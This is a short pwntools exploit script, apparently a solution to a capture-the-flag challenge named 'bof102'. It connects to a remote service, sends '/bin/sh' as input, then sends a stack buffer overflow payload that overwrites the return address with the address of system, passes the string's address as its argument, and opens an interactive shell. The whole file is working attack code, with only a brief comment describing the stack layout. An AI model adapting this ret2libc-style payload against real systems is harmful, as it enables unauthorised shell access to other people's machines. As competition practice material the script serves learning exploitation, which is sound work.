from pwn import *

"""
name < "/bin/sh"
ebp-0x10 > input
ret < system
ret + 4 < stuff
ret + 8 < name address
"""

r = remote("bof102.sstf.site", 1337)

name = 0x804a034
system = 0x80483e0

pay = b"A" * (0x10 + 4)
pay += p32(system)
pay += b"AAAA"
pay += p32(name)

print(r.recvuntil(b"> "))
r.sendline(b"/bin/sh")
print(r.recvuntil(b"> "))
r.sendline(pay)

r.interactive()
